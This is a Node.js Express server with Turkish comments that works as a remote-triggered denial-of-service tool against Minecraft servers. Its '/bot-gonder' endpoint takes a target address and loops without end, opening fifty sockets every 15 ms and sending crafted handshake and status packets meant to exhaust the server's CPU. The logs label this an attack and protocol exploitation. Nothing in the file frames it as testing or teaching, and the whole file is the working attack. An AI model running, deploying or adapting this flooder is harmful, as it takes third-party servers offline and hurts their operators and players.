const express = require('express');
const net = require('net');
const app = express();
const port = process.env.PORT || 10000;

let isRunning = false;

app.get('/bot-gonder', (req, res) => {
    const { ip } = req.query;
    const [host, targetPort] = ip.split(':');
    const portNum = parseInt(targetPort) || 25565;

    if (isRunning) return res.send("Saldırı Devam Ediyor...");
    isRunning = true;

    console.log(`[KRİTİK SALDIRI] ${host}:${portNum} - Protokol Sömürüsü Başladı.`);

    const attack = () => {
        if (!isRunning) return;

        for (let i = 0; i < 50; i++) {
            const socket = new net.Socket();
            socket.setTimeout(1500);

            socket.connect(portNum, host, () => {
                // 1. Handshake Paketi (Sürüm: 1.20.1, State: 1 - Status)
                // Bu paket sunucuyu 'ping' yanıtı vermeye zorlar, en çok CPU harcayan kısımdır.
                const handshake = Buffer.from([0x0f, 0x00, 0xef, 0x05, 0x09, 0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x68, 0x6f, 0x73, 0x74, 0x63, 0xdd, 0x01]);
                const request = Buffer.from([0x01, 0x00]);
                
                socket.write(handshake);
                socket.write(request);
                
                // Sunucuyu meşgul etmek için bağlantıyı hemen kapatma, 500ms bekle
                setTimeout(() => socket.destroy(), 500);
            });

            socket.on('error', () => socket.destroy());
            socket.on('timeout', () => socket.destroy());
        }
        
        // Render'ın RAM'ini korumak için kısa bir nefes (15ms)
        setTimeout(attack, 15);
    };

    attack();
    res.send("Protokol Sömürüsü Aktif!");
});

app.get('/bot-zipla', (req, res) => res.send("READY"));
app.listen(port, '0.0.0.0');
